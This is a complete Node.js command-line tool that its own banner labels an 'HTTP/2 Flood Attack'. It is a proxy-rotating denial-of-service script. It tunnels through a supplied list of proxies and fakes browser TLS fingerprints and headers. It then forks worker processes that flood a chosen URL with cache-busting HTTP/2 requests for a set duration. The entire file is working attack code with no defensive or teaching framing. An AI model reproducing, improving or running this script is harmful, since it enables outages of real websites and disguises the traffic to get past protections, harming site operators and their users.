const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

// Configuration
const CONFIG = {
    SOCKET_TIMEOUT: 10000,
    REQUEST_INTERVAL: 100,
    WORKER_INTERVAL: 10,
    MAX_REQUESTS_PER_BURST: 10,
    PROXY_CONNECT_TIMEOUT: 10000
};

// Cipher configuration
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const CIPHERS = "GREASE:" + [
    defaultCiphers[0],
    defaultCiphers[1],
    defaultCiphers[2],
    ...defaultCiphers.slice(3)
].join(":");

// Headers
const HEADERS = {
    ACCEPT: [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    ],
    CACHE: [
        'no-cache',
        'max-age=0',
        'no-store',
    ],
    LANGUAGE: [
        'en-US,en;q=0.9',
        'en-US,en;q=0.5',
    ],
    USER_AGENTS: [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
    ]
};

// TLS Configuration
const SIGALGS = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256";
const ECDH_CURVE = "X25519:P-256:P-384";
const SECURE_OPTIONS = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

// Argument parsing
if (process.argv.length < 7) {
    console.log('Usage: node cfTzy.js <host> <time> <rate> <threads> <proxy.txt>');
    process.exit(1);
}

const ARGS = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 60,
    rate: parseInt(process.argv[4]) || 10,
    threads: parseInt(process.argv[5]) || 1,
    proxyFile: process.argv[6]
};

// Validate URL
let parsedTarget;
try {
    parsedTarget = new URL(ARGS.target);
    if (!parsedTarget.hostname) throw new Error('Invalid URL');
} catch (e) {
    console.error('Error: Invalid target URL');
    process.exit(1);
}

// Read proxies with better error handling
function readProxies(filePath) {
    try {
        if (!fs.existsSync(filePath)) {
            throw new Error('Proxy file not found');
        }
        
        const content = fs.readFileSync(filePath, "utf-8");
        const proxies = content.split(/\r?\n/)
            .map(line => line.trim())
            .filter(line => {
                if (!line) return false;
                const parts = line.split(':');
                return parts.length >= 2 && !isNaN(parseInt(parts[1]));
            });
        
        if (proxies.length === 0) {
            throw new Error('No valid proxies found in file');
        }
        
        return proxies;
    } catch (e) {
        console.error(`Error reading proxy file: ${e.message}`);
        process.exit(1);
    }
}

const PROXIES = readProxies(ARGS.proxyFile);
let proxyIndex = 0;

// Round-robin proxy selection
function getNextProxy() {
    if (PROXIES.length === 0) return null;
    const proxy = PROXIES[proxyIndex % PROXIES.length];
    proxyIndex++;
    return proxy;
}

// Utility functions
function randomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function generateRandomString(length = 8) {
    return Math.random().toString(36).substring(2, 2 + length);
}

function generateQueryString() {
    const params = ['utm_source', 'utm_medium', 'utm_campaign', 'v', 't', 'id', 'ref', 'session', 'cache'];
    const param = randomElement(params);
    const value = generateRandomString();
    return `${param}=${value}`;
}

// Improved ProxyConnection class
class ProxyConnection {
    static connect(proxy, target, callback) {
        const [host, port] = proxy.split(':');
        const socket = new net.Socket();
        
        socket.setTimeout(CONFIG.PROXY_CONNECT_TIMEOUT);
        socket.setKeepAlive(true, 60000);
        
        const connectRequest = `CONNECT ${target.hostname}:${target.port || 443} HTTP/1.1\r\n` +
                              `Host: ${target.hostname}:${target.port || 443}\r\n` +
                              `Connection: keep-alive\r\n` +
                              `Proxy-Connection: keep-alive\r\n\r\n`;
        
        socket.connect(parseInt(port), host, () => {
            socket.write(connectRequest);
        });
        
        let buffer = '';
        const onData = (data) => {
            buffer += data.toString();
            if (buffer.includes('\r\n\r\n')) {
                socket.removeListener('data', onData);
                if (buffer.includes('200')) {
                    callback(null, socket);
                } else {
                    socket.destroy();
                    callback(new Error(`Proxy failed: ${buffer.split('\r\n')[0]}`));
                }
            }
        };
        
        socket.on('data', onData);
        socket.on('error', (err) => callback(err));
        socket.on('timeout', () => {
            socket.destroy();
            callback(new Error('Proxy connection timeout'));
        });
    }
}

// Create HTTP/2 headers
function createHTTP2Headers(target) {
    const path = target.pathname === '/' ? '/' : target.pathname + target.search;
    const query = generateQueryString();
    const separator = target.search ? '&' : '?';
    
    return {
        ':method': 'GET',
        ':scheme': target.protocol.replace(':', ''),
        ':path': `${path}${separator}${query}`,
        ':authority': target.host,
        'accept': randomElement(HEADERS.ACCEPT),
        'accept-language': randomElement(HEADERS.LANGUAGE),
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': randomElement(HEADERS.CACHE),
        'user-agent': randomElement(HEADERS.USER_AGENTS),
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'dnt': '1',
        'pragma': 'no-cache'
    };
}

// Session manager
class SessionManager {
    constructor() {
        this.sessions = new Map();
        this.failedProxies = new Set();
    }
    
    getSession(proxy, target) {
        const key = `${proxy}|${target.host}`;
        return this.sessions.get(key);
    }
    
    setSession(proxy, target, session) {
        const key = `${proxy}|${target.host}`;
        this.sessions.set(key, session);
        
        // Clean up on session close
        session.on('close', () => {
            this.sessions.delete(key);
        });
    }
    
    markProxyFailed(proxy) {
        this.failedProxies.add(proxy);
        setTimeout(() => this.failedProxies.delete(proxy), 60000); // Remove after 1 minute
    }
    
    isProxyFailed(proxy) {
        return this.failedProxies.has(proxy);
    }
}

const sessionManager = new SessionManager();

// Attack worker function
function attackWorker() {
    const proxy = getNextProxy();
    if (!proxy || sessionManager.isProxyFailed(proxy)) {
        return;
    }
    
    const target = parsedTarget;
    
    // Check for existing session
    const existingSession = sessionManager.getSession(proxy, target);
    if (existingSession && !existingSession.closed && !existingSession.destroyed) {
        sendRequests(existingSession, target);
        return;
    }
    
    ProxyConnection.connect(proxy, target, (err, socket) => {
        if (err) {
            sessionManager.markProxyFailed(proxy);
            return;
        }
        
        // Create TLS connection
        const tlsOptions = {
            socket: socket,
            host: target.hostname,
            servername: target.hostname,
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: CIPHERS,
            sigalgs: SIGALGS,
            ecdhCurve: ECDH_CURVE,
            secureOptions: SECURE_OPTIONS,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3'
        };
        
        const tlsSocket = tls.connect(443, target.hostname, tlsOptions);
        
        tlsSocket.on('secureConnect', () => {
            if (tlsSocket.alpnProtocol !== 'h2') {
                tlsSocket.destroy();
                socket.destroy();
                sessionManager.markProxyFailed(proxy);
                return;
            }
            
            // Create HTTP/2 session
            const client = http2.connect(target.origin, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    enablePush: false,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                    maxConcurrentStreams: 100
                },
                maxSessionMemory: 65536
            });
            
            client.on('connect', () => {
                sessionManager.setSession(proxy, target, client);
                sendRequests(client, target);
            });
            
            client.on('error', (err) => {
                client.destroy();
                sessionManager.markProxyFailed(proxy);
            });
            
            client.on('close', () => {
                tlsSocket.destroy();
                socket.destroy();
            });
        });
        
        tlsSocket.on('error', () => {
            tlsSocket.destroy();
            socket.destroy();
            sessionManager.markProxyFailed(proxy);
        });
        
        tlsSocket.setTimeout(CONFIG.SOCKET_TIMEOUT, () => {
            tlsSocket.destroy();
            socket.destroy();
            sessionManager.markProxyFailed(proxy);
        });
    });
}

function sendRequests(client, target) {
    if (client.closed || client.destroyed) return;
    
    const requestsToSend = Math.min(ARGS.rate, CONFIG.MAX_REQUESTS_PER_BURST);
    
    for (let i = 0; i < requestsToSend; i++) {
        try {
            const headers = createHTTP2Headers(target);
            const req = client.request(headers);
            
            req.setTimeout(5000, () => req.close());
            
            req.on('response', (headers) => {
                req.close();
                if (process.send) process.send('request');
            });
            
            req.on('error', () => {
                req.close();
            });
            
            req.end();
        } catch (e) {
            // Ignore request errors
        }
    }
}

// Cluster setup
if (cluster.isMaster) {
    console.log(`
╔══════════════════════════════════════════╗
║          HTTP/2 Flood Attack             ║
╚══════════════════════════════════════════╝
Target: ${parsedTarget.href}
Threads: ${ARGS.threads}
Duration: ${ARGS.time}s
Proxies: ${PROXIES.length}
Rate: ${ARGS.rate} req/sec
╔══════════════════════════════════════════╗
`);
    
    for (let i = 0; i < ARGS.threads; i++) {
        cluster.fork();
    }
    
    let totalRequests = 0;
    let startTime = Date.now();
    
    // Stats display
    const statsInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = elapsed > 0 ? Math.round(totalRequests / elapsed) : 0;
        
        console.log(`[+] Requests: ${totalRequests} | RPS: ${rps} | Active Workers: ${Object.keys(cluster.workers || {}).length}`);
    }, 2000);
    
    // Collect requests from workers
    cluster.on('message', (worker, message) => {
        if (message === 'request') {
            totalRequests++;
        }
    });
    
    // Handle worker exit
    cluster.on('exit', (worker, code, signal) => {
        if (!worker.exitedAfterDisconnect) {
            cluster.fork();
        }
    });
    
    // Stop attack after specified time
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log('\n[+] Attack completed');
        
        // Graceful shutdown
        Object.values(cluster.workers || {}).forEach(worker => {
            worker.disconnect();
        });
        
        setTimeout(() => {
            process.exit(0);
        }, 2000);
    }, ARGS.time * 1000);
    
} else {
    // Worker process
    let workerRequests = 0;
    
    const attackInterval = setInterval(() => {
        try {
            for (let i = 0; i < Math.ceil(ARGS.rate / ARGS.threads); i++) {
                attackWorker();
                workerRequests++;
            }
            
            if (process.send && workerRequests % 10 === 0) {
                process.send('request');
            }
        } catch (e) {
            // Silent error handling
        }
    }, CONFIG.WORKER_INTERVAL);
    
    // Cleanup on disconnect
    process.on('disconnect', () => {
        clearInterval(attackInterval);
        process.exit(0);
    });
    
    // Handle uncaught errors
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
}

// Global error handlers
process.on('SIGINT', () => {
    console.log('\n[!] Attack interrupted by user');
    process.exit(0);
});